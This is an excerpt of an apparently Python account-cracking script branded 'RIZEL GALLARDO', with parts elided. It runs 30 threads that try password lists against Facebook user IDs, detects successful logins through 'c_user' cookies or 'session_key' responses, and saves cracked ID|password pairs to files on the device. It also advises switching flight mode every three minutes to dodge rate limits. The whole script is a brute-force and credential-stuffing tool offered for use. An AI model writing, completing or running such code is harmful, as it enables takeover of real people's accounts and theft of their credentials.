...
\033[1;35m
╭────────────────────────────────────────────────────╮
   \033[1;35m[◉] Owner     :   RIZEL GALLARDO\033[1;35m
   \033[1;35m[◉] Github    :   404\033[1;35m
   \033[1;35m[◉] Status    :   TRIAL\033[1;35m
   \033[1;35m[◉] Facebook  :   RIZEL GALLARDO\033[1;35m
   \033[1;35m[◉] Version   :   3.2\033[1;35m         
╰────────────────────────────────────────────────────╯""")
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' \033[1;35mTotal Accounts : \033[1;32m'+total_ids+f' \n \033[1;35mMethod : \033[1;37mM{mthd}')
			print(f"\033[1;35m Use Flight Mode Every 3 MINS\033[1;36m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RIZEL - M4] %s | \033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;9m [PRIMO-DEAD] '+ids+' | '+pas+'\033[1;97m')
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RIZEL M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [RIZEL–OK] %s | %s'%(ids,pas))
                                #cek_apk(session,coki)
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;9m [RIZEL–DEAD] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RIZEL–DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [RIZEL M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RIZEL–ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RIZEL–ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [RIZEL M1] %s | \033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RIZEL M1–ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RIZEL–ALIVE.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;9m [RIZEL M1–DEAD] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcardRIZEL–DEAD.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/RIZEL–DEAD.txt','a').write(ids+'|'+pas+'\n')
